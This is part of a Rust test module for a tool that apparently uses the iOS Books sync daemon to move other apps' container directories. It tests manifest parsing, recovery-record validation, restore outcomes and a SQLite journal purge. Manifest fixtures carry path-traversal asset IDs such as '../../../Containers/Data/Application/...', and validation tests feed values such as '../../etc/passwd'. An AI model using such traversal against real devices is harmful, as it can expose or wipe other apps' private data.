        assert_eq!(rows.len(), 2);
        assert_eq!(
            rows[0]
                .as_dictionary()
                .unwrap()
                .get("Persistent ID")
                .and_then(plist::Value::as_string),
            Some("keep-1")
        );

        // No snapshot (Books never created one) is not an error: nothing to
        // preserve, so the request carries only the requested row.
        let (rows, ids) = preserved_rows(None, &requested).unwrap();
        assert!(rows.is_empty() && ids.is_empty());
        // An empty Books array likewise.
        let (rows, ids) = preserved_rows(Some(&catalog_plist(vec![])), &requested).unwrap();
        assert!(rows.is_empty() && ids.is_empty());
    }

    #[test]
    fn manifest_entries_expose_asset_id_and_download_flag() {
        // A plist dictionary shaped like the daemon's AssetManifest params.
        let mut entry_ok = plist::Dictionary::new();
        entry_ok.insert(
            "AssetID".to_owned(),
            plist::Value::String("../../../Containers/Data/Application/DEADBEEF".to_owned()),
        );
        entry_ok.insert("IsDownload".to_owned(), plist::Value::Boolean(true));
        let mut entry_not_download = plist::Dictionary::new();
        entry_not_download.insert("AssetID".to_owned(), plist::Value::String("kept.epub".to_owned()));
        entry_not_download.insert("IsDownload".to_owned(), plist::Value::Boolean(false));
        let mut entry_no_flag = plist::Dictionary::new();
        entry_no_flag.insert("AssetID".to_owned(), plist::Value::String("bare.epub".to_owned()));

        let mut manifest = plist::Dictionary::new();
        manifest.insert(
            "Book".to_owned(),
            plist::Value::Array(vec![
                plist::Value::Dictionary(entry_ok),
                plist::Value::Dictionary(entry_not_download),
                plist::Value::Dictionary(entry_no_flag),
            ]),
        );
        let mut params = plist::Dictionary::new();
        params.insert("AssetManifest".to_owned(), plist::Value::Dictionary(manifest));
        let mut dict = plist::Dictionary::new();
        dict.insert("Command".to_owned(), plist::Value::String("AssetManifest".to_owned()));
        dict.insert("Params".to_owned(), plist::Value::Dictionary(params));

        let entries = super::manifest_entry_ids(&dict);
        assert_eq!(entries.len(), 3);
        assert_eq!(
            entries[0],
            "../../../Containers/Data/Application/DEADBEEF IsDownload=true"
        );
        assert_eq!(entries[1], "kept.epub IsDownload=false");
        assert_eq!(entries[2], "bare.epub IsDownload=<absent>");

        // A payload without Params/AssetManifest must not panic or invent rows.
        assert!(super::manifest_entry_ids(&plist::Dictionary::new()).is_empty());
        assert!(SyncDiag::default().summary().contains("ReadyForSync=false"));
    }

    #[test]
    fn recovery_record_round_trips() {
        let record = RecoveryRecord {
            target: UUID_DIR.to_owned(),
            token: "abc123".to_owned(),
            basename: "Documents".to_owned(),
            parent: "/var/mobile/Containers/Data/Application/DEADBEEF-0000-0000-0000-000000000000"
                .to_owned(),
        };
        let bytes = serde_json::to_vec(&record).unwrap();
        let parsed: RecoveryRecord = serde_json::from_slice(&bytes).unwrap();
        assert_eq!(parsed.target, record.target);
        assert_eq!(parsed.token, record.token);
        assert_eq!(parsed.basename, record.basename);
        assert_eq!(parsed.parent, record.parent);
        assert!(record.validate().is_ok());
    }

    #[test]
    fn tampered_recovery_records_are_rejected() {
        let good = RecoveryRecord {
            target: UUID_DIR.to_owned(),
            token: "abc123".to_owned(),
            basename: "Documents".to_owned(),
            parent: "/var/mobile/Containers/Data/Application/DEADBEEF-0000-0000-0000-000000000000"
                .to_owned(),
        };
        let mut record = good.clone();
        record.parent = "/etc".to_owned();
        assert!(record.validate().is_err());

        let mut record = good.clone();
        record.parent = "/var/mobile/Library".to_owned();
        assert!(record.validate().is_err(), "parent must be a container root");

        let mut record = good.clone();
        record.target = "/var/mobile/Library/SpringBoard".to_owned();
        assert!(record.validate().is_err(), "target must live in the parent");

        let mut record = good.clone();
        record.basename = "../../etc".to_owned();
        assert!(record.validate().is_err());

        let mut record = good.clone();
        record.basename = "Other".to_owned();
        assert!(record.validate().is_err());

        let mut record = good;
        record.token = "../../etc/passwd".to_owned();
        assert!(record.validate().is_err());
    }

    #[test]
    fn kept_at_error_mentions_the_recovery_entry_point() {
        let message = super::kept_at_error("deadbeef", "boom");
        assert!(message.contains("kept at Airlock/Read/deadbeef"));
        assert!(message.contains("al_airlift_recover"));
    }

    // -- post-STEP-C decision table ------------------------------------------
    //
    // These pin the rule that made the data-loss report possible: a STEP B
    // failure is never allowed to end the run. Whatever STEP B reported, the
    // driver always submits STEP C, and only what the device reports *after*
    // that decides the outcome.
    #[test]
    fn restore_classification_never_loses_a_staged_copy() {
        use super::{classify_restore, RestoreOutcome};

        // Staged copy still there → keep it and tell the caller, whatever the
        // sessions said.
        for step_c_ok in [true, false] {
            assert_eq!(
                classify_restore(true, step_c_ok, true, true),
                RestoreOutcome::StillStaged
            );
            assert_eq!(
                classify_restore(true, step_c_ok, true, false),
                RestoreOutcome::StillStaged
            );
        }
        // STEP B failed and nothing was staged → STEP C found no work; report
        // STEP B's reason rather than a "kept at" copy that does not exist.
        assert_eq!(
            classify_restore(false, true, false, false),
            RestoreOutcome::NothingWasStaged
        );
        assert_eq!(
            classify_restore(false, true, false, true),
            RestoreOutcome::NothingWasStaged
        );
        // STEP B succeeded, staging drained, destination confirmed → restored.
        assert_eq!(
            classify_restore(true, true, false, true),
            RestoreOutcome::Restored
        );
        // Observed on device: the move completed even though the session
        // reported an error. Staging gone + destination present still wins.
        assert_eq!(
            classify_restore(true, false, false, true),
            RestoreOutcome::Restored
        );
        // Staging drained with no destination anywhere → cannot claim success
        // and cannot claim it is recoverable.
        assert_eq!(
            classify_restore(true, true, false, false),
            RestoreOutcome::GoneUnconfirmed
        );
    }

    /// Regression guard for the reported data loss ("lost app data / apps
    /// logged out"): the code between the STEP B verification and STEP C must
    /// not contain an early `return Err` driven by the pull check — that is
    /// exactly the path that stranded a moved directory in `Airlock/Read`.
    ///
    /// The one `return Err` that is allowed there is the recovery-record
    /// guard, which sits *after* `write_recovery_record` and is not a STEP B
    /// verdict. STEP C is submitted unconditionally; only the post-STEP-C
    /// `classify_restore` decides what the caller is told.
    #[test]
    fn step_b_verification_never_short_circuits_step_c() {
        let source = include_str!("airlift_dir.rs");
        let start = source
            .find("STEP B verification: bounded retry")
            .expect("STEP B verification marker");
        let end = source
            .find("STEP C restore (two FileCompletes in ONE session")
            .expect("STEP C marker");
        assert!(start < end, "the STEP B verification must precede STEP C");
        let between = &source[start..end];

        assert!(
            between.contains("wait_for_staged_listing"),
            "STEP B must verify through the retrying listing helper"
        );
        assert!(
            !between.contains("list_dir_json"),
            "STEP B must not do a single-shot list_dir_json check again"
        );
        let returns = between.matches("return Err").count();
        assert_eq!(
            returns, 1,
            "exactly one early return may live between STEP B and STEP C (the recovery-record guard), found {returns}"
        );
        assert!(
            between.find("write_recovery_record").unwrap() < between.find("return Err").unwrap(),
            "the only early return must be the one guarding write_recovery_record"
        );
    }

    // -- OutstandingAssets journal purge --------------------------------------
    //
    // The fixture is built through SQLite itself so the test needs no checked-in
    // database image and exercises the real SQL against a real engine.
    mod sqlite {
        use std::ffi::{c_char, c_int, c_void, CStr, CString};

        use super::super::{
            sqlite3_close_v2, sqlite3_errmsg, sqlite3_exec, sqlite3_open_v2, SQLITE_OPEN_CREATE,
            SQLITE_OPEN_READWRITE,
        };

        /// `sqlite3_exec` callback: appends the first column of every row.
        extern "C" fn collect(
            ctx: *mut c_void,
            _count: c_int,
            values: *mut *mut c_char,
            _names: *mut c_char,
        ) -> c_int {
            // SAFETY: SQLite hands us a live row of C strings; `ctx` is the
            // `&mut Vec<String>` `exec_with_arg` below passed in.
            unsafe {
                let out = &mut *(ctx as *mut Vec<String>);
                out.push(CStr::from_ptr(*values).to_string_lossy().into_owned());
            }
            0
        }

        pub fn open(path: &std::path::Path) -> *mut c_void {
            let c_path = CString::new(path.to_string_lossy().as_bytes()).unwrap();
            let mut db: *mut c_void = std::ptr::null_mut();
            // SAFETY: fresh out-pointer, live path, SQLite zero-initialises db.
            let rc = unsafe {
                sqlite3_open_v2(
                    c_path.as_ptr(),
                    &mut db,
                    SQLITE_OPEN_READWRITE | SQLITE_OPEN_CREATE,
                    std::ptr::null(),
                )
            };
            assert_eq!(rc, 0, "open {}: {}", path.display(), errmsg(db));
            db
        }

        fn errmsg(db: *mut c_void) -> String {
            // SAFETY: `db` is an open handle.
            unsafe { CStr::from_ptr(sqlite3_errmsg(db)).to_string_lossy().into_owned() }
        }

        /// Run one statement, discarding any rows.
        pub fn exec(db: *mut c_void, sql: &str) {
            let c_sql = CString::new(sql).unwrap();
            let mut err: *mut c_char = std::ptr::null_mut();
            // SAFETY: open handle, `c_sql` outlives the call, out-param is nulled.
            let rc = unsafe {
                sqlite3_exec(
                    db,
                    c_sql.as_ptr(),
                    std::ptr::null_mut(),
                    std::ptr::null_mut(),
                    &mut err,
                )
            };
            assert_eq!(rc, 0, "`{sql}` failed ({}): {err:?}", errmsg(db));
        }

        /// Run one query and collect the first column of every row.
        pub fn query_rows(db: *mut c_void, sql: &str) -> Vec<String> {
            let c_sql = CString::new(sql).unwrap();
            let mut err: *mut c_char = std::ptr::null_mut();
            let mut out: Vec<String> = Vec::new();
            // SAFETY: as above; `collect` is a plain `extern "C"` fn pointer and
            // `out` outlives the call.
            let rc = unsafe {
                sqlite3_exec(
                    db,
                    c_sql.as_ptr(),
                    collect as *mut c_void,
                    &mut out as *mut Vec<String> as *mut c_void,
                    &mut err,
                )
            };
            assert_eq!(rc, 0, "`{sql}` failed ({}): {err:?}", errmsg(db));
            out
        }

        /// `Persistent ID` of every row of `table`.
        pub fn persistent_ids(db: *mut c_void, table: &str) -> Vec<String> {
            query_rows(db, &format!("select ZPERSISTENTID from {table}"))
        }
    }

    /// Pins the CarrierSIM-fixpack purge (verified on iOS 27): every row whose
    /// `ZPERSISTENTID` is Books-relative — `../…`, `../../…`, and the
    /// `../../../Containers/…` spelling our own pulls use — is deleted from both
    /// `ZBCOUTSTANDINGASSET` and `ZBCINSTALLEDASSET`, while the device's own
    /// catalog rows survive untouched. A stale relative row is what makes the
    /// next run of the same asset look like its manifest was refused.
    #[test]
    fn purging_the_journal_drops_relative_ids_only() {
        let dir = std::env::temp_dir().join(format!("airlift-journal-test-{}", super::random_hex(6)));
        std::fs::create_dir_all(&dir).unwrap();
        let fixture = dir.join("OutstandingAssets_4.sqlite");
        let cleaned_path = dir.join("cleaned.sqlite");

        {
            let db = sqlite::open(&fixture);
            for table in super::OUTSTANDING_TABLES {
                sqlite::exec(
                    db,
                    &format!("create table {table}(ZPERSISTENTID text, ZASSETID text)"),
                );
            }
            sqlite::exec(
                db,
                "insert into ZBCOUTSTANDINGASSET values
                 ('../../airlift-pull-abc/p0/p1/p2/link','link'),
                 ('../../Airlock/Read/abc','read'),
                 ('../../../Containers/Data/Application/DEADBEEF/Documents','doc'),
                 ('Purchases/one.epub','keep-1')",
            );
            sqlite::exec(
                db,
                "insert into ZBCINSTALLEDASSET values
                 ('../../Airlock/Read/abc','read'),
                 ('iBooks://book.epub','keep-2')",
            );
            // WAL, like the on-device journal: the committed pages only reach
            // the main file when the last handle closes, so the purge has to
            // close before it reads the image back.
            sqlite::exec(db, "pragma journal_mode = WAL");
            let ids = sqlite::persistent_ids(db, "ZBCOUTSTANDINGASSET");
            assert_eq!(ids.len(), 4, "fixture must start with four rows");
            // SAFETY: `db` came from `sqlite::open` and is closed exactly once.
            unsafe { super::sqlite3_close_v2(db) };
        }

        let cleaned =
            super::purge_dead_outstanding_rows(&std::fs::read(&fixture).unwrap()).unwrap();
        assert!(!cleaned.is_empty(), "the cleaned image must not be empty");
        std::fs::write(&cleaned_path, &cleaned).unwrap();

        let db = sqlite::open(&cleaned_path);
        // Only the device's own catalog rows survive.
        assert_eq!(
            sqlite::persistent_ids(db, "ZBCOUTSTANDINGASSET"),
            vec!["Purchases/one.epub".to_owned()],
            "every Books-relative row must be gone from ZBCOUTSTANDINGASSET"
        );
        assert_eq!(
            sqlite::persistent_ids(db, "ZBCINSTALLEDASSET"),
            vec!["iBooks://book.epub".to_owned()],
            "every Books-relative row must be gone from ZBCINSTALLEDASSET too"
        );
        // SAFETY: `db` came from `sqlite::open` and is closed exactly once.
        unsafe { super::sqlite3_close_v2(db) };

        // The scratch copy `purge_dead_outstanding_rows` worked in must not be
        // left behind in the temp directory.
        let leaked: Vec<String> = std::fs::read_dir(std::env::temp_dir())
            .unwrap()
            .filter_map(|entry| entry.ok())
            .map(|entry| entry.file_name().to_string_lossy().into_owned())
            .filter(|name| name.starts_with("airlift-outstanding-"))
            .collect();
        assert!(leaked.is_empty(), "purge leaked scratch file(s): {leaked:?}");

        let _ = std::fs::remove_dir_all(&dir);
    }

    /// A database that is not SQLite at all must come back as an error rather
    /// than as a rewritten image — `clean_outstanding` turns that into one
    /// warning line, and it must never overwrite the file with garbage.
    #[test]
    fn purging_junk_is_reported_not_applied() {
        let junk = b"SQLite format 3\x00 but truncated, definitely not a database".to_vec();
        let err = super::purge_dead_outstanding_rows(&junk)
            .expect_err("a corrupt image must not be reported as cleaned");
        assert!(
            !err.is_empty(),
            "the error has to carry SQLite's own message for the log line"
        );
        // An empty file opens as a valid *empty* database, so the first DELETE
        // fails on the missing table — an error too, never a silent success.
        assert!(
            super::purge_dead_outstanding_rows(&[]).is_err(),
            "a database without the outstanding tables is an error, not a rewrite"
        );
    }
}
